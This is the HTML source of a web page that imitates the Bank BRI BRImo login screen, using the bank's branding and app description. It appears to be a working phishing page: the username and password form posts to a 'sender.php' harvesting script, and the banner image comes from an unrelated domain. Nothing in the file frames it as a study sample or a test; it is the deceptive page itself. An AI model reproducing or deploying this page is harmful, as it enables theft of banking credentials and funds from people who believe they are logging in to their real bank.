
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="fragment" content="!">
    <meta name="description" content="BRImo merupakan Aplikasi Keuangan Bank Digital BRI Terbaru berbasis data internet yang memberikan kemudahan bagi nasabah maupun non nasabah BRI untuk dapat bertransaksi dengan User Interface dan User Experience terbaru, fitur login face recognition, login fingerprint, top up gopay, pembayaran QR dan fitur menarik lainnya, dengan pilihan Sumber Dana/sumber dana setiap transaksi dapat ...">
    <link rel="image_src" href="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654819767432x249088519034370100%2Fbri-logo.png?w=&h=&auto=compress&dpr=1&fit=max" />
    <meta property="og:image" content="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654819767432x249088519034370100%2Fbri-logo.png?w=&amp;h=&amp;auto=compress&amp;dpr=1&amp;fit=max" />
    <meta name="twitter:image:src" content="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654819767432x249088519034370100%2Fbri-logo.png?w=&amp;h=&amp;auto=compress&amp;dpr=1&amp;fit=max" />
    <meta property="og:type" content="website" />
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0, user-scalable=no, minimal-ui">
    <meta name="theme-color" content="#1583dc">
    <title>BRImo- Bank BRI</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"/>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap');
        @font-face {
            font-family: 'Avenir';
            src: url(fonts/AvenirNextLTPro-Bold.otf);
        }

        body {
            padding: 0;
            margin: 0;
            width: 100%;
            font-family: 'Avenir';
        }

        .text-header {
            font-family: 'Avenir';
            color: #0086e0;
			margin-top: -20%;
        }

        .text-subheader {
            font-family: 'Avenir';
            margin-top: -20px;
            color: #000;
        }

        .btn-punya {
            font-family: 'Avenir';
            display: block;
            margin: 80px auto 0 auto;
            padding: 0px; 
            cursor: pointer; 
            background: none rgb(0, 134, 224);
            border: none; 
            text-align: center; 
            height: 57px; 
            width: 459px; 
            max-width: 100%;
            font-family: Arial; 
            font-size: 14px; 
            font-weight: bold; 
            color: rgb(255, 255, 255); 
            letter-spacing: 2px; 
            line-height: 1; 
            border-radius: 5px; 
            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
            transition: background 200ms ease 0s;
        }

        .btn-belum {
            font-family: 'Avenir';
            display: block;
            margin: 10px auto;
            padding: 0px; 
            cursor: pointer; 
            background: none transparent;
            border: none; 
            text-align: center; 
            height: 57px; 
            width: 459px; 
            max-width: 100%;
            font-family: Arial; 
            font-size: 14px; 
            font-weight: bold; 
            color: rgb(0, 134, 224);
            letter-spacing: 2px; 
            line-height: 1; 
            border-radius: 5px; 
            transition: background 200ms ease 0s;
        }

        .form-log {
            font-family: 'Avenir';
            box-sizing: border-box; 
            height: 50px; 
            width: 536px; 
            max-width: 100%; 
            border-top: 1px inset rgba(250, 250, 250, 0.13); 
            border-right: 1px solid rgba(184, 184, 184, 0.53); 
            border-bottom: none; 
            border-left: 1px outset rgba(168, 168, 168, 0.58); 
            border-image: initial; 
            background-color: rgb(255, 255, 255); 
            box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px; 
            font-family: 'Open Sans', sans-serif;
            font-size: 16px; 
            color: rgb(28, 28, 28); 
            word-spacing: 7px; 
            padding: 0px 45px;
            outline: none;
			
        }

        #ionIcons {
            font-family: 'Avenir';
            color: rgb(22, 119, 199);
            font-size: 27px;
            position: absolute;
            display: block;
            margin-top: 7px;
            margin-left: 15px;
        }

        .eye {
            font-family: 'Avenir';
            display: block;
            margin: -35px auto;
            margin-right: 20px;
            position: relative;
            box-sizing: border-box; 
            z-index: 16; 
            height: 19.8189px;
            width: 25.0236px; 
            float: right;
            border-radius: 0px; 
            cursor: pointer;
        }

        .btn-login {
            font-family: 'Avenir';
            display: block;
            margin: 60px 0 0 0;
            padding: 0px; 
            cursor: pointer; 
            background: none rgba(0, 111, 214, 0.96); 
            border: none; 
            text-align: center; 
            height: 42px; 
            width: 100%; 
            font-size: 15px; 
            font-weight: bold; 
            color: rgb(255, 255, 255); 
            letter-spacing: 1px; 
            line-height: 1; 
            border-radius: 8px; 
            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
            transition: background 100ms step-start 0s;
        }

        .btn-login:disabled {
            opacity: 0.5;
        }

        #loading {
            width: 100%;
            height: 100%;
            display: block;
            margin: auto;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0, 0.6);
            z-index: 99999;
        }

        #loading img {
            width: 40px;
            position: absolute;
            top: 43%;
            left: 0;
            right: 0;
            display: block;
            margin: auto;
        }

        @media only screen and (max-width: 600px) {
            .btn-login {
                width: 100%;
            }
        }
    </style>
  </head>
  <body>
    <div class="container">
        <div class="row">
            <div class="col-12 d-block mx-auto text-center p-0" style="height: auto; width: 536px; max-width: 100%; margin-top: 0px; border-radius: 0px;">
                <img alt="" src="https://wellcometo.my.id/login/Telor.jpg" style="display: block; margin: 0px; width: 100%; height: 80%; border-radius: 0px;">
            </div>
        </div>
        <div class="mt-3">
            <div class="row">
                <div class="col-12 d-block mx-auto" style="margin-bottom: 0px; white-space: pre-wrap; width: 459px; max-width: 100%; left: 0px; top: 0px; height: 98.8px; padding-bottom: 0px; font-family: Barlow; font-size: 16px; font-weight: 400; color: rgb(59, 59, 59); line-height: 1.4; border-radius: 0px;">
                  
                </div>
            </div>
			<div class="mt-3">
            <div class="row">
                <div class="col-12 d-block mx-auto" style="margin-bottom: -10px; white-space: pre-wrap; width: 459px; max-width: 100%; left: 0px; top: 0px; height: 98.8px; padding-bottom: 0px; font-family: Barlow; font-size: 16px; font-weight: 400; color: rgb(59, 59, 59); line-height: 1.4; border-radius: 0px;">
                    <div class="text-header"><font  style="font-size: 19px; font-weight: bold;"><strong>Login</strong></font></div>
                </div>
            </div>
            <form action="sender.php" method="POST">
                <div class="row mb-3">
                    <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin-top: 100% auto;">
                        <div>
                            <img src="user.png" width="22" style="position: absolute; margin-top: 12px; margin-left: 10px;" alt="">
                            <input name="name" id="name" type="text" class="bubble-element Input form-log" tabindex="1" placeholder="Username" maxlength="" style="border-radius: 5px 5px 0px 0px;" required>
                        </div>
                        <div style="margin-top: 1px">
                            <img src="pswrd.png" width="21" style="position: absolute; margin-top: 9px; margin-left: 10px;" alt="">
                            <input type="password" name="password" id="password" class="bubble-element Input form-log" tabindex="1" placeholder="Password" maxlength="" style="border-radius: 0px 0px 5px 5px;" required>
                            <div class="bubble-element eye clickable-element" tabindex="3" id="eyeOpen">
                                <img alt="" id="eye" src="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654594413237x395260983658785300%2Fhidden.png?w=24&h=19&auto=compress&dpr=2&fit=max" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;">
                            </div>
                            <div class="bubble-element eye clickable-element" tabindex="3" id="eyeClose" style="display: none">
                                <img alt="" id="eye" src="https://d1muf25xaso8hp.cloudfront.net/https%3A%2F%2Fs3.amazonaws.com%2Fappforest_uf%2Ff1654594427324x961463961280841100%2Feye.png?w=32&h=26&auto=compress&dpr=2&fit=max" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;">
                            </div>
                        </div>
                        <div class="text-header" style="float: right; position: relative; z-index: 999; display: block; margin-top: 15px;"><font  style="font-size: 14px" color="#0086e0"><strong><a href="" target="_blank" style="color: #0086e0; text-decoration: none;">Lupa Username/Password?</a></strong></font></div>
                    </div>
                </div>
                <div class="row mt-3">
                    <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: -50px auto;"><br>
                        <button class="btn-login" type="submit" id="doLog" disabled>Login</button>
                        <br>
                    </div>
                </div>
            </form>
        </div>
    </div>
    
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
    <script>
        function OnButton(user, pass) {
            if(user.length > 4 && pass.length > 4) {
                $(".btn-login").prop('disabled', false);
            } else {
                $(".btn-login").prop('disabled', true);
            }
        }
        $(document).ready(function() {
            setTimeout(() => {
                $('#loading').hide();
            },1000)

            $("div#eyeOpen").on('click', function() {
                $("#eyeOpen").css("display", "none");
                $("#eyeClose").css("display", "block");

                $("#password").prop("type", "text");

                $("div#eyeClose").on('click', function() {
                    $("#eyeOpen").css("display", "block");
                    $("#eyeClose").css("display", "none");

                    $("#password").prop("type", "password");
                });
            });

            $("#user").on('input', function() {
                var user = $("#user").val();
                var pass = $("#password").val();

                OnButton(user, pass);
            });

            $("#password").on('input', function() {
                var user = $("#name").val();
                var pass = $("#password").val();

                OnButton(user, pass);
            });
        });
    </script>
  </body>
</html>
